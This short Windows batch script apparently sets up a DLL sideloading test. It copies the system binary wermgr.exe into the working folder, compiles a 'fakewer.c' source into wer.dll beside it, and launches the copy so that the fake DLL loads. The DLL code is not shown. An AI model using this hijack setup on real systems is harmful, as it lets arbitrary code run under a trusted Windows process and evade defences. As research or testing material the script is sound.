@echo off
copy C:\WINDOWS\System32\wermgr.exe %cd%\wermgr.exe>NUL
gcc -o wer.dll -shared -std=c11 -s -O3 fakewer.c
wermgr.exe
::del wermgr.exe>NUL
::del wer.dll>NUL